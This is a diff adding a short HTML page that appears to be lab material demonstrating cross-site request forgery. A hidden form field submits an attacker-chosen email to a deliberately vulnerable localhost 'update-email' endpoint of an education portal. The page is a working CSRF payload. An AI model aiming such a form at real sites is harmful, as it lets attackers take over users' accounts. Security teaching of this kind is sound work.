@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demonstration - Vulnerable Target</title>
+</head>
+<body>
+    <h1>CSRF Demonstration Page (Vulnerable Version)</h1>
+    <p>This page demonstrates a cross-origin form submission
+       against the VULNERABLE Education Portal endpoint.</p>
+    <form action="http://127.0.0.1:5000/vulnerable/update-email" method="POST">
+        <input type="hidden" name="email" value="vuln-attack-2026@example.com">
+        <button type="submit">Run CSRF Demonstration</button>
+    </form>
+</body>
+</html>
